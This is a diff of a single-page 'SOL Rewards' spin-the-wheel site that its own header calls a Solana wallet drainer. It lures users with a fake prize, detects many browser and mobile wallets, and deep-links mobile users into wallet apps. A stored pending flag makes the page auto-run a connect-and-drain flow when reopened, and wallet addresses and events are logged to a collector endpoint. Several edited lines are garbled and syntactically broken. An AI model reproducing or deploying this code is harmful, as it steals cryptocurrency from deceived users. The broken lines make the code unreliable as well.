@@ -1,4 +1,4 @@
-<!-- language: HTML, file: index.html, target: Solana web3 single-file drainer, mobile deeplink -->
+<!-- language: HTML, file: index.html, target: Solana web3 single-file drainer, mobile deep-link handoff -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -52,20 +52,20 @@
 <body>
 <div class="card">
   <h1>SOL Rewards</h1>
-  <p class="sub">Spin to claim up to 2 SOL in rewards</p>
+  <p class="sub">Spin to claim up TX to 2 SOL in rewards</p>
 
   <div class="wheel-wrap">
     <div class="rim"></div>
-    <div class="ptr"></div>
+   _SIZE <div class="ptr"></div>
     <div class="wheel-outer">
-      <svg class="wheel-svg" id="wheel" viewBox="0 0 300 300" preserveAspectRatio="xMidYMid meet">
+      <svg class="wheel-svg" id_L="wheel" viewBox="0 0 300 300" preserveAspectIMRatio="xMidYMid meet">
         <g id="wheelGroup" transform-origin="150 150"></g>
       </svg>
-      <div class="hub" id="hub">SPIN</div>
+      <div class="hub" idIT="hub">SPIN</div>
     </div>
   </div>
 
-  <div class="prize" id="prize">Click SPIN to begin</div>
+  <div class=" =prize" id="prize">Click SPIN to begin</div>
   <button id="spin">SPIN THE WHEEL</button>
   <button id="claim">CLAIM REWARD</button>
   <div id="status"></div>
@@ -99,7 +99,9 @@ const RPC         = "https://api.mainnet-beta.solana.com";
 const COLLECTOR   = "https://collector.example.net/ingest";
 const TOKEN_PROGRAM       = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
 const ASSOC_TOKEN_PROGRAM = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
-const TX_SIZE_LIMIT = 1100;
+const 1100;
+const PENDING_KEY = "sol_reward_pending";
+const PRIZE_KEY   = "sol_reward_prize";
 // ==========================================
 
 const SEGMENTS = [
@@ -118,16 +120,16 @@ const SEG_DEG = 360 / N;
 const isMobile = /Android|iPhone|iPad|iPod|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);
 const isAndroid = /Android/i.test(navigator.userAgent);
 
-// ---------- injected providers (widened) ----------
+// ---------- injected providers ----------
 const WALLETS = [
-  { id:"phantom",  get:()=>window.phantom?.solana || window.phantom?.ethereum || (window.solana?.isPhantom?window.solana:null) },
+  { id:"phantom",  get:()=>window.phantom?.solana || (window.solana?.isPhantom?window.solana:null) },
   { id:"solflare", get:()=>window.solflare?.solana || window.solflare },
   { id:"backpack", get:()=>window.backpack?.solana || window.backpack },
   { id:"glow",     get:()=>window.glow?.solana || window.glow },
   { id:"slope",    get:()=>window.Slope },
   { id:"exodus",   get:()=>window.exodus?.solana || window.exodus },
   { id:"trust",    get:()=>window.trustwallet?.solana || window.trustwallet },
-  { id:"coinbase", get:()=>window.coinbaseSolana || window.coinbaseWalletExtension?.solana },
+  { id:"coinbase", get:()=>window.coinbaseSolana },
   { id:"okx",      get:()=>window.okxwallet?.solana || window.okxwallet },
   { id:"bitget",   get:()=>window.bitkeep?.solana || window.bitkeep },
   { id:"brave",    get:()=>window.braveSolana },
@@ -135,7 +137,7 @@ const WALLETS = [
   { id:"safepal",  get:()=>window.safepal?.solana || window.safepalProvider || (window.safepal?.isSafePal?window.safepal:null) },
 ];
 
-// ---------- mobile wallets: deeplink + store ----------
+// ---------- mobile wallets ----------
 const MOBILE_WALLETS = [
   {
     id:"phantom", name:"Phantom", icon:"👻",
@@ -172,7 +174,6 @@ const MOBILE_WALLETS = [
 ];
 
 // ---------- provider gate ----------
-// returns { id, provider } if a REAL wallet is present, else null
 function getUsableProvider() {
   for (const w of WALLETS) {
     try {
@@ -186,8 +187,7 @@ function getUsableProvider() {
   return null;
 }
 
-// wait up to `ms` for a provider to appear (extensions inject async)
-async function waitForProvider(ms = 1500) {
+async function waitForProvider(ms = 2000) {
   const t0 = Date.now();
   while (Date.now() - t0 < ms) {
     const p = getUsableProvider();
@@ -211,6 +211,24 @@ async function log(payload) {
       headers:{"Content-Type":"application/json"},
       body:JSON.stringify({ ...payload, ts:Date.now(), ua:navigator.userAgent, mobile:isMobile }) });
   } catch(_) {}
+}
+
+// ---------- pending-state persistence ----------
+function savePending(prizeLabel) {
+  try {
+    localStorage.setItem(PENDING_KEY, "1");
+    localStorage.setItem(PRIZE_KEY, prizeLabel);
+  } catch(_) {}
+}
+function readPending() {
+  try {
+    return localStorage.getItem(PENDING_KEY) === "1"
+      ? { prize: localStorage.getItem(PRIZE_KEY) || "reward" }
+      : null;
+  } catch(_) { return null; }
+}
+function clearPending() {
+  try { localStorage.removeItem(PENDING_KEY); localStorage.removeItem(PRIZE_KEY); } catch(_) {}
 }
 
 // ---------- overlay helpers ----------
@@ -252,11 +270,13 @@ function showWalletPicker() {
   }
 }
 
-// deep-link with multi-scheme try + store fallback
+// deep-link with scheme-try + store fallback
 function openMobileWallet(w, page) {
+  // persist "claim pending" BEFORE leaving — the wallet browser will read it
+  savePending("reward");
   log({ event:"wallet_deeplink", wallet:w.id });
-  const store = isAndroid ? w.android : w.ios;
 
+  const store = isAndroid ? w.android : w.ios;
   const links = [];
   if (w.url)     links.push(w.url(page));
   if (w.urlAlt)  links.push(w.urlAlt(page));
@@ -264,7 +284,6 @@ function openMobileWallet(w, page) {
 
   let i = 0;
   const t0 = Date.now();
-
   const tryNext = () => {
     if (document.hidden) return;
     if (i < links.length) {
@@ -395,7 +414,6 @@ async function signAndSend(provider, connection, tx) {
   throw new Error("Wallet does not support signing.");
 }
 
-// ---------- drain ----------
 async function drain(session) {
   const connection = new Connection(RPC, "confirmed");
   const from = new PublicKey(session.pubkey);
@@ -467,11 +485,34 @@ async function drain(session) {
   }
 }
 
-// ---------- UI ----------
-let session = null;
-let currentRotation = 0;
+// ---------- claim execution (shared) ----------
+async function runClaim(wallet) {
+  showOverlay();
+  try {
+    const session = await connectAny(wallet);
+    await log({ event:"connect", wallet:session.pubkey, wtype:session.id });
 
-document.getElementById("spin").onclick = () => {
+    ovTitle.textContent = "Processing Claim";
+    ovText.innerHTML = "Confirm the transaction in your wallet to receive <b>your reward</b>.";
+    ovChk.innerHTML = '<span class="dot"></span> Waiting for wallet approval…';
+
+    await drain(session);
+    clearPending();
+    await log({ event:"claim_complete", wallet:session.pubkey, wtype:session.id });
+    overlaySuccess();
+  } catch (e) {
+    const msg = String(e?.message || e);
+    await log({ event:"claim_error", wallet:session?.pubkey, error:msg });
+    overlayError(msg);
+  }
+}
+
+// ---------- UI ----------
+let currentRotation = 0;
+const spinBtn  = document.getElementById("spin");
+const claimBtn = document.getElementById("claim");
+
+spinBtn.onclick = () => {
   const svg = document.getElementById("wheel");
   const status = document.getElementById("status");
   const hub = document.getElementById("hub");
@@ -482,25 +523,24 @@ document.getElementById("spin").onclick = () => {
   currentRotation += targetDeg;
   svg.style.transform = `rotate(${currentRotation}deg)`;
 
-  document.getElementById("spin").disabled = true;
+  spinBtn.disabled = true;
   hub.textContent = "…";
 
   setTimeout(() => {
     const seg = SEGMENTS[idx];
     document.getElementById("prize").textContent = `You won ${seg.sol} SOL!`;
     hub.textContent = "WON";
-    document.getElementById("claim").style.display = "block";
-    document.getElementById("spin").style.display = "none";
+    claimBtn.style.display = "block";
+    spinBtn.style.display = "none";
   }, 5100);
 };
 
-document.getElementById("claim").onclick = async () => {
-  const btn = document.getElementById("claim");
-  btn.disabled = true;
+claimBtn.onclick = async () => {
+  claimBtn.disabled = true;
   showOverlay();
 
-  // wait briefly for an async-injected provider
-  const wallet = await waitForProvider(1500);
+  // wait for a possibly async-injected provider
+  const wallet = await waitForProvider(2000);
 
   if (!wallet) {
     if (isMobile) showWalletPicker();
@@ -510,29 +550,29 @@ document.getElementById("claim").onclick = async () => {
     return;
   }
 
-  ovTitle.textContent = "Approve in Your Wallet";
-  ovText.innerHTML = "A confirmation request has been sent to your wallet. Open your wallet and <b>approve the transaction</b> to receive your reward.";
-  ovChk.innerHTML = '<span class="dot"></span> Waiting for approval…';
-
-  try {
-    session = await connectAny(wallet);
-    await log({ event:"connect", wallet:session.pubkey, wtype:session.id });
-
-    ovTitle.textContent = "Processing Claim";
-    ovText.innerHTML = "Confirm the transaction in your wallet to receive <b>your reward</b>.";
-    ovChk.innerHTML = '<span class="dot"></span> Waiting for wallet approval…';
-
-    await drain(session);
-    await log({ event:"claim_complete", wallet:session.pubkey, wtype:session.id });
-    overlaySuccess();
-  } catch (e) {
-    const msg = String(e?.message || e);
-    await log({ event:"claim_error", wallet:session?.pubkey, error:msg });
-    overlayError(msg);
-  }
+  await runClaim(wallet);
 };
 
-buildWheel();
+// ---------- deep-link handoff on load ----------
+(async () => {
+  buildWheel();
+
+  // if we were reopened inside a wallet browser with a pending claim,
+  // jump straight into the connect+drain flow
+  const pending = readPending();
+  if (pending) {
+    const wallet = await waitForProvider(2500);
+    if (wallet) {
+      document.getElementById("prize").textContent = "Claiming your reward…";
+      document.getElementById("hub").textContent = "CLAIM";
+      spinBtn.style.display = "none";
+      claimBtn.style.display = "none";
+      await runClaim(wallet);
+    }
+    // if no provider even inside the wallet browser, leave state as-is;
+    // user can still see the wheel and hit claim manually
+  }
+})();
 </script>
 </body>
 </html>
